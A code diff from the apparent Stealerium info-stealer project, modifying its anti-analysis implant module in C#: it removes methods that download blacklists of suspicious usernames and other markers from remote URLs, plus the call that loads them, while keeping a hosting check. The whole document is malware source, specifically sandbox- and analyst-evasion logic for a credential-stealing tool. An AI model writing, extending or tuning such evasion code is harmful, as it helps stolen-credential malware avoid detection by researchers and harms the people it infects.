@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
@@ -60,57 +60,6 @@ namespace Stealerium.Stub.Modules.Implant
         {
             Timeout = TimeSpan.FromSeconds(10) // Set a reasonable timeout
         };
-
-        /// <summary>
-        /// Loads a HashSet of strings from a given URL. Each line in the text file represents an item.
-        /// </summary>
-        /// <param name="key">The key representing the list.</param>
-        /// <returns>A Task representing the asynchronous operation.</returns>
-        private static async Task LoadListAsync(string key)
-        {
-            if (!ListUrls.ContainsKey(key))
-            {
-                Logging.Log($"AntiAnalysis: No URL defined for key '{key}'.");
-                return;
-            }
-
-            if (Blacklists[key] != null)
-                return; // Already loaded
-
-            try
-            {
-                var response = await HttpClient.GetAsync(ListUrls[key]).ConfigureAwait(false);
-                response.EnsureSuccessStatusCode();
-                var content = await response.Content.ReadAsStringAsync().ConfigureAwait(false);
-
-                var hashSet = new HashSet<string>(
-                    content
-                        .Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries)
-                        .Select(line => line.Trim().ToLowerInvariant()),
-                    StringComparer.OrdinalIgnoreCase // Ensures case-insensitive lookups
-                );
-
-                Blacklists[key] = hashSet;
-                Logging.Log($"AntiAnalysis: Successfully loaded '{key}' list with {hashSet.Count} entries.");
-            }
-            catch (Exception ex)
-            {
-                Logging.Log($"AntiAnalysis: Failed to load '{key}' list from {ListUrls[key]}. Exception: {ex.Message}");
-                Blacklists[key] = new HashSet<string>(); // Initialize as empty to prevent null checks
-            }
-        }
-
-        /// <summary>
-        /// Ensures that all blacklists are loaded concurrently.
-        /// </summary>
-        /// <returns>A Task representing the asynchronous operation.</returns>
-        private static async Task EnsureAllListsLoadedAsync()
-        {
-            var loadTasks = ListUrls.Keys
-                .Where(key => key != "Services")
-                .Select(key => LoadListAsync(key));
-            await Task.WhenAll(loadTasks).ConfigureAwait(false);
-        }
 
         /// <summary>
         /// Detects if the current PC username is listed in the suspicious PC usernames list.
@@ -446,10 +395,6 @@ namespace Stealerium.Stub.Modules.Implant
         {
             try
             {
-                // Load all blacklists concurrently
-                var loadTask = EnsureAllListsLoadedAsync();
-                loadTask.Wait(); // Wait synchronously
-
                 // Hosting check
                 var hostingTask = HostingAsync();
                 hostingTask.Wait();
